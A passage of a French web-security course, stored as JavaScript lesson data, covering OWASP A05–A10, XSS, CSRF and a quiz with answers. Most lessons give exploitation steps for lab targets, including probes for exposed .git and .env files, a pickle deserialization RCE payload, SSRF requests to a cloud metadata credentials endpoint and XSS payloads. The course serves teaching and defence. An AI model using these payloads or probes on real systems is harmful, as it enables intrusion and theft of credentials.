              "L'application ou son environnement est mal configuré : des fonctionnalités par défaut restent actives, des pages d'erreur révèlent des informations, des répertoires sont listables, des en-têtes de sécurité manquent, des comptes par défaut existent. Ce n'est pas le code qui est mauvais, c'est le réglage."
            ),
            p(
              "Exemples typiques : serveur qui affiche sa version exacte (Apache/2.4.54), CORS configuré en Access-Control-Allow-Origin: *, fichiers de sauvegarde .bak exposés dans le dossier web, page d'erreur détaillant les chemins internes."
            ),
            h("Pourquoi c'est dangereux"),
            p(
              "Parce que chaque réglage par défaut ou chaque fichier exposé est une porte déjà ouverte. Une page d'erreur qui révèle le chemin du code aide l'attaquant à viser. Un CORS * avec Access-Control-Allow-Credentials: true permet à n'importe quel site de lire les réponses de l'API — donc les données. Un dossier .git exposé permet de télécharger le code source entier de l'application. Souvent, une seule misconfiguration suffit à transformer une faille bénigne en compromission totale."
            ),
            h("Exemple de configuration vulnérable"),
            code(`Access-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n# ← n'importe quel site peut lire les réponses de cette API, cookies inclus`),
            h("Comment l'exploiter, pas à pas"),
            p(
              "Les tests de terrain, sur tes labos uniquement : vérifier les en-têtes de sécurité, détecter les fichiers exposés, repérer les pages d'erreur verbeuses."
            ),
            code(`# 1) Vérifier les en-têtes de sécurité d'une réponse\ncurl -sI http://127.0.0.1:8000/ | grep -iE "content-security|x-frame|strict-transport"\n\n# 2) Détecter le listage des répertoires ou les fichiers exposés\ngobuster dir -u http://127.0.0.1:8000 -w /usr/share/wordlists/dirb/common.txt\ncurl -s http://127.0.0.1:8000/.git/HEAD    # exposé ? → le code source fuit\ncurl -s http://127.0.0.1:8000/backup.sql   # base de données ?\ncurl -sI http://127.0.0.1:8000/.env\n\n# 3) Repérer les pages d'erreur verbeuses\ncurl -s "http://127.0.0.1:8000/page-inexistante.php?id=oops"\n# une stack trace PHP révélant chemins et versions = fuite d'information`),
            h("Comment s'en protéger"),
            list(
              "Bannière minimale : masquer les versions (Apache, nginx, PHP, framework).",
              "En-têtes de sécurité systématiques : Content-Security-Policy, X-Frame-Options: DENY (empêche l'iframe → clickjacking), X-Content-Type-Options: nosniff, Referrer-Policy, Strict-Transport-Security.",
              "CORS le plus restrictif possible : liste blanche explicite de domaines autorisés, jamais * avec credentials.",
              "Pages d'erreur génériques en production : aucun chemin, aucune version, aucun détail SQL.",
              "Désactiver le listage de répertoires, masquer les fichiers de configuration (.git, .env, .bak) hors du dossier public.",
              "Désactiver les comptes et mots de passe par défaut, changer les ports d'administration, appliquer les correctifs de configuration de sécurité."
            ),
            callout(
              "Le dossier .git exposé est l'un des signaux les plus graves de misconfiguration : il permet de télécharger tout l'historique du code source, donc de trouver les secrets et les failles. Vérifie toujours .git/HEAD, .env et backup.* lors d'un audit — en labo uniquement.",
              "warning"
            ),
            callout(
              "L'énumération de fichiers et de répertoires (gobuster, curl sur des chemins devinés) se fait uniquement sur tes labos ou les scopes autorisés. Balayer un site tiers est un délit.",
              "danger"
            ),
            h("En résumé"),
            list(
              "A05 = « les réglages par défaut sont des hypothèques » : chaque option laissée par défaut est une porte non fermée.",
              "Un audit de configuration est une vérification d'inventaire : qu'est-ce qui est ouvert, exposé, bavard, superflu ?",
              "Les en-têtes de sécurité, les pages d'erreur génériques et le CORS restrictif sont tes premières défenses.",
              "Le listage des répertoires et les fichiers .git/.env exposés sont des fuites d'information directes."
            )
          ]
        },
        {
          id: "owasp-lecon-09",
          title: "A06 — Vulnerable and Outdated Components",
          type: "theory",
          duration: "15 min",
          blocks: [
            h("Chaque bibliothèque oubliée est une dette"),
            p(
              "Les applications modernes sont des assemblages : bibliothèques JavaScript, frameworks, modules, plugins, images de conteneurs. Cette catégorie concerne les composants connus comme vulnérables parce qu'ils sont obsolètes ou non patchés."
            ),
            p(
              "Une CVE (Common Vulnerabilities and Exposures) est l'identifiant normalisé d'une vulnérabilité publique, par exemple CVE-2021-44228. Le NVD (National Vulnerability Database), base de données publique américaine, la référence avec sa gravité. Un composant non mis à jour depuis des années contient souvent des CVE connues de tous : une faille qui n'attend que d'être trouvée."
            ),
            h("Pourquoi c'est dangereux"),
            p(
              "Parce que c'est la faille la plus facile à exploiter : l'attaquant n'a rien à inventer. La CVE est documentée publiquement, des exploits publics existent souvent (y compris dans Metasploit), et l'application vulnérable n'a pas changé."
            ),
            p(
              "Le cas historique le plus parlant : Log4Shell (CVE-2021-44228), une faille dans la bibliothèque Java log4j présente dans des millions de serveurs. Quelques heures après sa divulgation, des scans massifs parcouraient Internet pour la trouver. Les exploits publics arrivent souvent en moins de 48 heures après la divulgation d'une CVE critique."
            ),
            h("Exemple de composant vulnérable"),
            p(
              "Il n'y a pas de ligne de code fautive : le problème est dans le fichier de dépendances. Ces deux versions sont vulnérables : lodash < 4.17.12 expose une faille de prototype pollution (CVE-2019-10744), et jquery < 3.5 expose des XSS connus."
            ),
            code(`{\n  "dependencies": {\n    "lodash": "4.17.11",\n    "jquery": "1.12.4"\n  }\n}`),
            h("Comment l'exploiter, pas à pas"),
            p(
              "On ne code pas un exploit : on identifie le composant, puis on applique l'exploit public, en labo. Les outils du niveau 4 (whatweb, curl -sI) relèvent les technologies et les versions."
            ),
            code(`# 1) Énumérer les technologies de la cible puis relever leur version\ncurl -sI http://127.0.0.1:8000/ | grep -i server\nwhatweb http://127.0.0.1:8000/\n\n# 2) Chercher les CVE connues pour la version trouvée\nsearchsploit "apache 2.4.49"    # ex. path traversal CVE-2021-41773\n\n# 3) Reproduire l'exploit documenté sur la copie labo uniquement`),
            h("Comment s'en protéger"),
            list(
              "Inventorier tous les composants et versions : un SBOM (Software Bill of Materials), la « liste des ingrédients » logiciels d'une application.",
              "Surveiller les CVE de ces composants : NVD, GitHub Advisories, osv.dev.",
              "Purger ou remplacer les composants obsolètes, non maintenus ou abandonnés.",
              "Automatiser la détection : npm audit, pip-audit, trivy, grype, dependabot.",
              "Appliquer les mises à jour de sécurité rapidement : les exploits publics arrivent souvent en moins de 48 h."
            ),
            callout(
              "Un composant avec une CVE connue est un risque exploitable même si l'exploit n'est pas encore public : la CVE est documentée, et les scripts d'exploitation apparaissent souvent en heures ou en jours.",
              "warning"
            ),
            callout(
              "Searchsploit et les exploits publics se testent uniquement sur des copies de labo que tu contrôles. Tester un exploit Log4Shell ou autre contre un serveur réel sans autorisation écrite est un délit.",
              "danger"
            ),
            h("En résumé"),
            list(
              "A06 = « chaque bibliothèque oubliée est une dette qui rapporte des intérêts en exploits ».",
              "On ne peut pas sécuriser ce qu'on ne connaît pas : la première défense est l'inventaire (SBOM).",
              "Les CVE sont publiques et les exploits aussi : un composant obsolète est une porte ouverte.",
              "Log4Shell (CVE-2021-44228) est l'exemple historique : des millions de serveurs, des scans en quelques heures."
            )
          ]
        },
        {
          id: "owasp-lecon-10",
          title: "A07 — Identification and Authentication Failures",
          type: "theory",
          duration: "18 min",
          blocks: [
            h("La porte d'entrée est mal gardée"),
            p(
              "L'identification (qui es-tu ?) et l'authentification (prouve-le) sont les portes d'entrée de l'application. Cette catégorie regroupe tous les défauts autour de ces mécanismes : bruteforce possible (pas de limite de tentatives), credential stuffing, session fixation, MFA faible ou contournable, mots de passe faibles autorisés, réinitialisation de mot de passe fragile, stockage en clair des identifiants."
            ),
            h("Pourquoi c'est dangereux"),
            p(
              "Parce qu'une porte d'entrée fragile, c'est tout le reste qui s'effondre. Un compte sans protection contre le bruteforce se devine ; un compte avec un mot de passe déjà volé ailleurs se prend par credential stuffing ; une session qu'on peut fixer se détourne ; un MFA par SMS se contourne par phishing. C'est la première étape de presque tous les scénarios d'attaque sérieux."
            ),
            h("Les attaques à connaître"),
            list(
              "Bruteforce : essai systématique des mots de passe, avec hydra ou Burp Intruder, sur une liste comme rockyou.txt. Si l'application n'implémente aucun rate limiting, l'attaquant teste des milliers de combinaisons en quelques minutes.",
              "Credential stuffing : réutiliser des listes de mots de passe volées sur d'autres sites. Une fuite ailleurs, et tous les comptes utilisant le même couple login/mot de passe tombent.",
              "Session fixation : forcer la session d'une victime à une valeur connue, puis attendre qu'elle se connecte. Si le serveur ne renouvelle pas la session après connexion, l'attaquant l'utilise.",
              "MFA faible : le MFA par SMS se contourne par phishing ; les applications d'authentification (TOTP) sont plus robustes."
            ),
            h("Exemple de code vulnérable"),
            p(
              "Aucune limitation de tentatives : un robot peut essayer des millions de combinaisons."
            ),
            code(`<?php\n$user = $_POST["username"];\n$pass = $_POST["password"];\n// PAS de compteur de tentatives, PAS de délai, PAS de CAPTCHA\n$req = "SELECT * FROM users WHERE username = '$user' AND password = '$pass'";\n//     ← A07 : un robot peut essayer des millions de combinaisons + A03 : SQLi\n?>`),
            h("Comment l'exploiter, pas à pas"),
            p(
              "Le bruteforce se fait avec hydra sur une liste de mots de passe comme rockyou.txt (liste publique de mots de passe volés, fournie avec Kali Linux). Si l'application n'implémente aucun rate limiting, des milliers de combinaisons tombent en quelques minutes. Nous le verrons en détail dans le laboratoire de la leçon 23."
            ),
            p(
              "Le test de session fixation : fixer le cookie de la victime à une valeur connue, puis vérifier si le serveur le change après connexion. S'il le conserve, la session est volable."
            ),
            h("Le rate limiting et le code 429"),
            p(
              "Le rate limiting (limitation du débit de requêtes) est la défense de base contre le bruteforce. Après 3 à 5 échecs, l'application impose un délai croissant, puis répond 429 Too Many Requests. C'est le garde-fou : sur une application protégée, hydra finit sans succès et le serveur renvoie 429 au-delà du seuil."
            ),
            h("Comment s'en protéger"),
            list(
              "Rate limiting et verrouillage progressif : 3-5 échecs → délai croissant ; réponse 429 Too Many Requests.",
              "MFA pour les comptes sensibles, en préférant les applications d'authentification (TOTP) au SMS.",
              "Mots de passe robustes, vérifiés contre les listes de fuites (API Pwned Passwords).",
              "Renouveler les identifiants de session après connexion (neutralise la session fixation) ; invalider les sessions côté serveur.",
              "Réinitialisation de mot de passe sécurisée : lien à usage unique, lié au compte, jamais une simple question « quel est ton film préféré ? ».",
              "Ne jamais stocker les mots de passe en clair (voir A02)."
            ),
            callout(
              "Attention à la distinction : un bruteforce sans rate limiting est une faille A07. La réponse 429, elle, n'est pas une faille : c'est la défense qui fonctionne. Le risque de verrouillage de comptes par un scan trop agressif existe aussi — d'où un débit poli et autorisé.",
              "info"
            ),
            callout(
              "Le bruteforce se teste uniquement sur des labos que tu possèdes, avec une autorisation écrite ou une plateforme d'entraînement. Lancer hydra sur un formulaire de connexion réel est un délit (article 323-1 du Code pénal), et un débit trop agressif se transforme en déni de service.",
              "danger"
            ),
            h("En résumé"),
            list(
              "A07 = « la porte d'entrée est mal gardée » : pas de limite d'essais, sessions volables, MFA absent.",
              "Bruteforce, credential stuffing et session fixation sont les trois attaques à connaître.",
              "Le rate limiting avec réponse 429 et le verrouillage progressif coupent l'attaque en masse.",
              "Renouveler la session après connexion neutralise la session fixation."
            )
          ]
        },
        {
          id: "owasp-lecon-11",
          title: "A08 — Software and Data Integrity Failures",
          type: "theory",
          duration: "16 min",
          blocks: [
            h("On ne peut pas faire confiance à ce qui arrive de l'extérieur"),
            p(
              "Cette catégorie regroupe les attaques contre l'intégrité : la certitude que le code et les données n'ont pas été modifiés par un tiers. Les deux formes principales : la désérialisation non sécurisée (l'application convertit des données sérialisées en objets du langage, en faisant confiance au flux d'entrée) et les pipelines non vérifiés (mises à jour de logiciels, images de conteneurs, dépendances téléchargées sans vérification de signature)."
            ),
            p(
              "En 2021, la catégorie élargit l'ancienne Insecure Deserialization pour couvrir toute faille d'intégrité du code et des données."
            ),
            h("Pourquoi c'est dangereux"),
            p(
              "La désérialisation est redoutable : l'attaquant envoie un flux d'objets conçu pour déclencher, à la construction des objets, l'exécution de code arbitraire. C'est une RCE (Remote Code Execution, exécution de code à distance). Un pipeline non vérifié est tout aussi grave : si le mécanisme de mise à jour d'un logiciel ne vérifie pas la signature des paquets, un attaquant peut distribuer son propre logiciel à des milliers de machines (attaque de la chaîne d'approvisionnement, supply chain). Les dépendances non signées relèvent aussi de cette catégorie."
            ),
            h("Exemple de code vulnérable"),
            p(
              "Python : désérialiser avec pickle un flux fourni par l'utilisateur. pickle.loads() peut exécuter du code à la désérialisation."
            ),
            code(`import pickle\n\ndata = request.get_data()     # ← flux fourni par l'utilisateur\nobj = pickle.loads(data)      # ← A08 : exécute du code à la désérialisation !`),
            h("Comment l'exploiter, pas à pas"),
            p(
              "En labo, on construit un flux pickle malveillant qui exécute une commande à la désérialisation. Démonstration uniquement sur une machine isolée."
            ),
            code(`import pickle, os\n\nclass RCE:\n    def __reduce__(self):\n        return (os.system, ("id",))    # s'exécute quand pickle.loads() lit le flux\n\nmalicious = pickle.dumps(RCE())       # ← objet sérialisé malveillant\nprint(malicious.hex())                # le flux à envoyer à l'application`),
            p(
              "Quand l'application désérialise ce flux, la fonction __reduce__ est appelée et la commande id s'exécute sur le serveur. C'est une exécution de code à distance. En labo uniquement, et sur une machine jetable."
            ),
            h("Le versant supply chain"),
            p(
              "Les dépendances non signées (téléchargées sans vérification de checksum) et les mises à jour sans vérification de signature relèvent de la même catégorie : si un attaquant parvient à remplacer le paquet, tout le monde installe son code. C'est pourquoi on vérifie les signatures des artefacts de build et qu'on verrouille les dépendances à une version précise dans un registre privé."
            ),
            h("Comment s'en protéger"),
            list(
              "Ne jamais désérialiser de données non fiables ; quand c'est inévitable, utiliser des formats sûrs (JSON) et des bibliothèques dédiées.",
              "Vérifier les signatures et les checksums des dépendances et des mises à jour, ainsi que les signatures des artefacts de build (CI/CD).",
              "Isoler les pipelines de build et de déploiement, verrouiller les dépendances (version précise, registre privé).",
              "Prouver l'intégrité des flux de données (MAC/HMAC, signatures numériques)."
            ),
            callout(
              "La désérialisation d'un flux non fiable peut exécuter du code arbitraire (RCE). C'est une attaque contre l'intégrité du logiciel, d'où son classement en A08 et non en injection : le danger vient de la construction des objets, pas d'un interpréteur SQL.",
              "info"
            ),
            callout(
              "Le payload pickle de démonstration s'exécute UNIQUEMENT sur une machine virtuelle jetable que tu contrôles. Envoyer un flux désérialisé malveillant à une application réelle est un délit.",
              "danger"
            ),
            h("En résumé"),
            list(
              "A08 = « on ne peut pas faire confiance à ce qui arrive de l'extérieur ».",
              "La désérialisation non sécurisée peut mener à une RCE (exécution de code à distance).",
              "Les pipelines non vérifiés (mises à jour, dépendances sans signature) ouvrent la porte à la supply chain.",
              "L'intégrité se prouve par signature, pas par espérance."
            )
          ]
        },
        {
          id: "owasp-lecon-12",
          title: "Quiz intermédiaire 2 — A04, A05, A06, A07, A08",
          type: "quiz",
          duration: "10 min",
          blocks: [
            p(
              "Deuxième bilan : conception, configuration, composants, authentification et intégrité. 6 questions. 80 % pour valider ce module."
            ),
            callout(
              "Relis les leçons 7 à 11 si une question te semble difficile : tout ce qui est demandé y est expliqué.",
              "info"
            )
          ],
          quiz: [
            {
              question: "La catégorie A04 (Insecure Design) se distingue des autres parce que :",
              options: [
                "Elle est impossible à corriger",
                "Elle concerne un défaut de conception/logique, pas une erreur de code isolée",
                "Elle ne concerne que les bases de données",
                "Elle est la plus rare du classement",
              ],
              answer: 1,
              explanation:
                "Exemple : une quantité négative acceptée dans un flux de paiement. C'est l'architecture qui suppose des choses fausses ; un simple correctif de ligne ne suffit pas, il faut repenser le flux.",
            },
            {
              question: "Un fichier .env téléchargé via l'URL publique du site relève de :",
              options: [
                "A03 Injection",
                "A05 Security Misconfiguration",
                "A07 Auth",
                "A08 Intégrité",
              ],
              answer: 1,
              explanation:
                "Un fichier de configuration exposé est un réglage défectueux (misconfiguration), sous-famille « fichiers exposés ».",
            },
            {
              question: "Le credential stuffing consiste à :",
              options: [
                "Deviner un mot de passe par force brute",
                "Réutiliser des listes de mots de passe volées sur d'autres sites",
                "Fixer la session d'une victime",
                "Intercepter le trafic TLS",
              ],
              answer: 1,
              explanation:
                "Il exploite la réutilisation des mots de passe : une fuite ailleurs, et tous les comptes utilisant ce couple login/mot de passe tombent.",
            },
            {
              question: "Le code HTTP 429 signifie :",
              options: [
                "L'utilisateur n'est pas authentifié",
                "La ressource n'existe pas",
                "Trop de requêtes envoyées (rate limiting actif)",
                "Erreur interne du serveur",
              ],
              answer: 2,
              explanation:
                "429 Too Many Requests est la réponse du rate limiting : le garde-fou du bruteforce. Son absence, elle, est la faille A07.",
            },
            {
              question: "La désérialisation non sécurisée relève de :",
              options: [
                "A08 Software and Data Integrity Failures",
                "A03 Injection",
                "A02 Cryptographic Failures",
                "A10 SSRF",
              ],
              answer: 0,
              explanation:
                "Désérialiser un flux non fiable peut exécuter du code arbitraire (RCE), une attaque contre l'intégrité du logiciel.",
            },
            {
              question: "Un composant avec une CVE connue est un risque exploitable même si l'exploit n'est pas encore public :",
              options: [
                "Vrai, la CVE est documentée et les exploits apparaissent souvent en heures ou jours",
                "Faux, tant que l'exploit n'est pas public la faille n'existe pas",
                "Faux, une CVE est toujours corrigée immédiatement",
                "Vrai, mais uniquement si le composant est en JavaScript",
              ],
              answer: 0,
              explanation:
                "La CVE est documentée, les scripts d'exploitation apparaissent souvent en heures ou en jours. Un composant vulnérable est une faille qui n'attend qu'à être utilisée (A06).",
            },
          ],
        },
      ],
    },
    {
      id: "owasp-module-3",
      title: "Surveillance, SSRF et le front-end",
      lessons: [
        {
          id: "owasp-lecon-13",
          title: "A09 — Security Logging and Monitoring Failures",
          type: "theory",
          duration: "14 min",
          blocks: [
            h("On n'arrête que ce qu'on voit"),
            p(
              "Cette catégorie concerne l'absence ou l'insuffisance de journalisation (logging : enregistrement des événements) et de surveillance (monitoring : détection des anomalies). L'application ne journalise pas les échecs de connexion, ne journalise pas les actions sensibles, ne génère pas d'alertes, et les journaux ne sont ni protégés ni analysés. Conséquence directe : une intrusion passe inaperçue, parfois pendant des mois."
            ),
            h("Pourquoi c'est dangereux"),
            p(
              "Si tu ne le vois pas, tu ne peux ni le stopper ni le comprendre. Le temps de détection d'une intrusion (le dwell time) se mesure souvent en mois. Sans journaux, impossible de savoir quoi l'attaquant a fait, quelles données il a touchées, par où il est entré — donc impossible de corriger, d'alerter les victimes, ou de défendre son dossier devant les tribunaux ou les assureurs."
            ),
            p(
              "C'est le filet de sécurité de toutes les autres catégories : un site peut être cassé (A01, A03…), mais s'il journalise, on peut au moins répondre. S'il ne journalise pas, l'attaque est invisible."
            ),
            h("Exemple de code vulnérable"),
            code(`<?php\nif ($user && password_verify($pass, $hash)) {\n    // connexion réussie... et RIEN n'est journalisé\n} else {\n    // échec... et RIEN n'est journalisé non plus\n    // ← A09 : pas de log, pas d'alerte, pas d'horodatage\n}\n?>`),
            h("Comment le tester, pas à pas"),
            p(
              "Un attaquant n'exploite pas A09 activement : il en profite. Le pentester, lui, vérifie que l'application journalise. On provoque des événements de sécurité et on vérifie s'ils apparaissent dans les logs."
            ),
            code(`# Test : provoquer des événements de sécurité et vérifier s'ils apparaissent dans les logs\n# 1) 5 connexions échouées volontaires\n# 2) 1 connexion réussie\n# 3) consulter les logs du serveur (Apache : /var/log/apache2/access.log)\ntail -n 20 /var/log/apache2/access.log\n# Si on ne distingue PAS les échecs des succès, si aucune alerte n'existe → A09 confirmé`),
            h("Comment s'en protéger"),
            list(
              "Journaliser : échecs et succès de connexion, changements de privilèges, opérations sensibles (suppression, virement), chaque événement avec horodatage, adresse IP, identifiant utilisateur et résultat.",
              "Protéger les journaux contre la modification (les attaquants effacent leurs traces) et les archiver selon les exigences réglementaires.",
              "Centraliser (SIEM : outil d'agrégation et d'analyse des journaux) et alerter sur les schémas anormaux : 10 échecs en 1 minute, accès admin la nuit.",
              "Tester régulièrement que la journalisation fonctionne : les logs silencieux n'existent pas."
            ),
            callout(
              "Le test d'un bruteforce (10 échecs) suivi d'une connexion réussie depuis la même IP est une signature classique que tout SIEM doit détecter. Quand tu audites une application, vérifie TOUJOURS que ces événements laissent une trace — c'est la question « avons-nous des logs ? » de la réponse à incident.",
              "tip"
            ),
            h("En résumé"),
            list(
              "A09 = « on n'arrête que ce qu'on voit ».",
              "Sans journaux, une intrusion n'est ni détectée ni comprise : le dwell time se mesure en mois.",
              "On journalise les échecs et succès de connexion, les changements de privilèges et les opérations sensibles.",
              "Des journaux complets, protégés et surveillés transforment une intrusion silencieuse en incident traité en quelques heures."
            )
          ]
        },
        {
          id: "owasp-lecon-14",
          title: "A10 — Server-Side Request Forgery (SSRF)",
          type: "theory",
          duration: "18 min",
          blocks: [
            h("Le serveur fait les devoirs de l'attaquant"),
            p(
              "SSRF (Server-Side Request Forgery) : l'attaquant fait exécuter des requêtes HTTP par le serveur, à la place de l'application, vers des adresses que le serveur peut joindre mais que l'attaquant ne peut pas joindre directement. Le cas le plus classique : la fonction « vérifier une URL » ou « importer une image depuis une URL » demande au serveur de charger une URL — l'attaquant lui donne une URL interne."
            ),
            h("Pourquoi c'est dangereux"),
            p(
              "Le serveur se situe dans le réseau interne : il peut atteindre localhost, les autres serveurs de la société, les bases de données, les interfaces d'administration et — dans le cloud — le service de métadonnées des fournisseurs (AWS, GCP, Azure), accessible à l'adresse spéciale 169.254.169.254. Ce service répond aux machines de l'infrastructure avec leurs secrets : clés d'accès cloud, tokens, identifiants."
            ),
            p(
              "Un SSRF bien exploité peut donc transformer une petite fonctionnalité « prévisualiser une image » en vol des clés du cloud entier. C'est rare dans le classement (3,11 % d'occurrence) mais souvent catastrophique : c'est la seule catégorie ajoutée en 2021 sur la base d'un sondage de la communauté des pentesters."
            ),
            h("Exemple de code vulnérable"),
            p(
              "Une fonction qui charge une URL fournie par l'utilisateur, avec les droits réseau du serveur."
            ),
            code(`import requests\n\n@app.post("/apercu")\ndef apercu():\n    url = request.form["url"]        # ← entièrement contrôlée par l'utilisateur\n    reponse = requests.get(url)      # ← le SERVEUR fait la requête vers cette URL\n    return reponse.text              # ← et renvoie la réponse à l'attaquant`),
            h("Comment l'exploiter, pas à pas"),
            p(
              "En labo, on donne au serveur des URLs internes. Le test minimal et le plus parlant : le localhost du serveur."
            ),
            code(`# 1) Tester le localhost du serveur\ncurl -X POST "http://127.0.0.1:8000/apercu" -d "url=http://127.0.0.1:8000/internal/admin"\n\n# 2) Scanner de petites plages du réseau interne du serveur (en labo)\ncurl -X POST "http://127.0.0.1:8000/apercu" -d "url=http://192.168.50.10:80/admin"\n\n# 3) En cloud, tenter le métadata service (AWS/GCP/Azure) — UNIQUEMENT sur tes labos cloud\ncurl -X POST "http://127.0.0.1:8000/apercu" \\\n     -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"\n# Si le serveur renvoie la réponse : les clés cloud sont récupérables → SSRF critique`),
            h("Les pièges à connaître"),
            p(
              "Ne pas tester 127.0.0.1 en premier est l'erreur classique : c'est le test minimal. Il faut aussi penser aux redirections : l'application peut filtrer 127.0.0.1 mais suivre une redirection d'un domaine autorisé vers une IP interne — on teste avec -L ou un domaine que tu contrôles. Et aux schémas : certains SSRF acceptent file://, gopher://… Il faut tester le comportement avec différents schémas, en labo."
            ),
            h("Comment s'en protéger"),
            list(
              "Liste blanche d'hôtes et de schémas autorisés : n'accepter que https:// vers des domaines connus ; refuser les IP privées (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.169.254) et les redirections.",
              "Valider côté serveur, jamais côté client ; résoudre puis revérifier le DNS (l'attaquant peut faire pointer son domaine vers une IP interne).",
              "Segmenter le réseau : le serveur web ne doit pas avoir d'accès direct au métadata ni aux services internes.",
              "Privilégier IMDSv2 (qui exige un en-tête de session) plutôt que IMDSv1, pour limiter l'impact d'un SSRF cloud."
            ),
            callout(
              "169.254.169.254 est l'adresse link-local du métadata service d'AWS, GCP et Azure : elle n'est joignable que depuis les machines du cloud. Un SSRF vers cette adresse peut exposer les clés cloud — c'est pourquoi un tel SSRF est qualifié de critique : l'attaquant sort de l'application et prend le contrôle de l'infrastructure.",
              "warning"
            ),
            callout(
              "Les tests SSRF se font uniquement sur tes labos (applications locales, machines virtuelles, labs PortSwigger) et tes propres labos cloud. Tester le métadata d'un cloud qui ne t'appartient pas, ou balayer le réseau interne d'un tiers, est un délit.",
              "danger"
            ),
            h("En résumé"),
            list(
              "A10 = « le serveur fait les devoirs de l'attaquant ».",
              "Toute fonction qui charge une URL fournie par l'utilisateur peut devenir un cheval de Troie vers le réseau interne.",
              "Le métadata cloud (169.254.169.254) transforme un SSRF en vol de clés.",
              "On ne laisse jamais un serveur aller là où il n'a pas besoin d'aller : liste blanche, blocage des IP privées, IMDSv2."
            )
          ]
        },
        {
          id: "owasp-lecon-15",
          title: "XSS approfondi : réfléchi, stocké et DOM",
          type: "theory",
          duration: "20 min",
          blocks: [
            h("Exécuter ton code dans le navigateur de la victime"),
            p(
              "XSS (Cross-Site Scripting, script inter-sites) : l'attaquant fait exécuter du JavaScript par le navigateur de la victime, à l'insu de la victime et de l'application. L'application affiche sans contrôle un contenu qui contient un <script>. Le navigateur l'exécute avec les droits de la page : origine du domaine, cookies de session inclus. XSS n'attaque pas le serveur : il attaque les visiteurs du serveur."
            ),
            p(
              "En 2021, le XSS n'a plus de catégorie autonome : il est fusionné dans A03 Injection, car c'est une injection de code dans le navigateur de la victime."
            ),
            h("Les trois types de XSS"),
            list(
              "Réfléchi : le payload vit dans l'URL (paramètre GET) et s'exécute quand la victime clique sur le lien piégé. Exemple : site.fr/recherche?q=<script>alert(1)</script>",
              "Stocké : le payload vit dans la base de données (commentaire, profil) et s'exécute pour tous les visiteurs de la page. Un commentaire contenant <script>…",
              "DOM : le payload vit dans le code JavaScript de la page, jamais envoyé au serveur, et s'exécute pendant le rendu côté navigateur. Exemple : site.fr/#<img src=x onerror=alert(1)>"
            ),
            h("Pourquoi c'est dangereux"),
            p(
              "Le JavaScript exécuté dans le contexte d'un site peut : lire document.cookie (vol de session), usurper l'identité de la victime, afficher un faux formulaire (hameçonnage intégré), rediriger vers un site malveillant, enregistrer les frappes clavier, ou envoyer des requêtes au nom de la victime. Un XSS stocké sur un forum public devient une épidémie : chaque lecteur est touché. C'est l'une des failles les plus rapportées en bug bounty."
            ),
            h("Exemple de code vulnérable"),
            code(`<?php\n// XSS réfléchi : le nom est affiché SANS encodage\necho "Bonjour " . $_GET["name"] . " !";   // ← A03 : entrée non encodée en sortie\n?>`),
            code(`// XSS DOM : le navigateur insère un fragment d'URL dans innerHTML\ndocument.getElementById("resultat").innerHTML = location.hash.substring(1);\n// ← le "#..." de l'URL devient du HTML exécutable`),
            h("Comment tester les trois types, pas à pas"),
            p(
              "Sur DVWA ou Juice Shop, en labo. La preuve minimale est une boîte d'alerte inoffensive : alert(1)."
            ),
            code(`# XSS réfléchi — tester d'abord l'affichage de l'entrée, puis injecter\nhttp://127.0.0.1/dvwa/vulnerabilities/xss_r/?name=<script>alert(1)</script>\n# Variantes si <script> est filtré :\n<img src=x onerror=alert(1)>\n<svg/onload=alert(1)>\n\n# XSS stocké — dans un champ de commentaire (DVWA xss_s), poster :\n<script>alert('stocke')</script>\n# puis recharger la page : le script s'exécute à chaque affichage\n\n# XSS DOM — Juice Shop, champ de recherche :\n<iframe src="javascript:alert('xss')">`),
            h("La méthode : chercher le contexte avant le payload"),
            list(
              "Cherche les endroits où l'application affiche une entrée utilisateur : recherche, nom, commentaire, message d'erreur.",
              "Envoie une chaîne neutre avec des marqueurs, par exemple testXYZ<>\"'() pour voir où elle apparaît dans le HTML source : dans une balise ? dans un attribut ? entre guillemets ?",
              "Adapte le payload au contexte : hors balise → <script> ; dans un attribut → fermer l'attribut \"><img src=x onerror=alert(1)> ; dans une valeur JavaScript → ';alert(1)//",
              "Valide d'abord avec un alert(1) inoffensif, puis passe au vol de cookie en labo uniquement."
            ),
            h("Comment s'en protéger"),
            list(
              "Encoder la sortie (output encoding) selon le contexte : HTML, attribut, JS, URL. Les frameworks le font souvent automatiquement — ne jamais désactiver l'encodage automatique.",
              "CSP (Content-Security-Policy) : en-tête HTTP qui dit au navigateur « n'exécute que les scripts provenant de ces origines » et interdit les scripts inline.",
              "Ne jamais utiliser innerHTML ni eval avec des données utilisateur ; préférer textContent et createElement.",
              "Filtrer côté serveur par liste blanche (autoriser ce qui est connu) plutôt que par liste noire (toujours incomplète)."
            ),
            callout(
              "La différence clé entre réfléchi et stocké : le réfléchi n'existe que si la victime clique sur un lien piégé (il faut du phishing), le stocké touche tout visiteur sans action de sa part. Note bien le contexte d'injection (balise, attribut, JS) dans ton rapport : l'impact et la correction en dépendent.",
              "info"
            ),
            callout(
              "Un XSS « prouvé » avec alert(1) suffit en labo. Le vol de cookie ne se teste que sur tes propres machines. Lancer un payload XSS sur un site réel est un délit.",
              "danger"
            ),
            h("En résumé"),
            list(
              "Ne jamais afficher d'entrée utilisateur sans l'encoder : un XSS = un autre utilisateur exécute ton code dans son navigateur, dans ton contexte de session.",
              "Trois types : réfléchi (URL), stocké (base), DOM (navigateur seul).",
              "La défense : encodage de sortie selon le contexte, CSP, pas d'innerHTML avec des données utilisateur.",
              "L'en-tête HttpOnly sur les cookies empêche JavaScript de les lire — un garde-fou utile, mais qui ne suffit pas face à toutes les formes de XSS."
            )
          ]
        },
        {
          id: "owasp-lecon-16",
          title: "CSRF — Cross-Site Request Forgery",
          type: "theory",
          duration: "15 min",
          blocks: [
            h("Abuser de la confiance entre navigateur et serveur"),
            p(
              "CSRF (Cross-Site Request Forgery, falsification de requête inter-sites) : un site malveillant, contrôlé par l'attaquant, fait envoyer par ton navigateur une requête authentique vers le site cible, en profitant de ta session déjà ouverte."
            ),
            p(
              "Le scénario classique : tu es connecté à ta banque dans un onglet ; dans un autre onglet tu ouvres un site piégé ; ce site affiche une « image » dont l'URL est en réalité https://banque.fr/virement?montant=10000&dest=ATTAQUANT. Ton navigateur envoie la requête avec ton cookie de session, et la banque exécute le virement."
            ),
            h("Ce n'est pas une injection"),
            p(
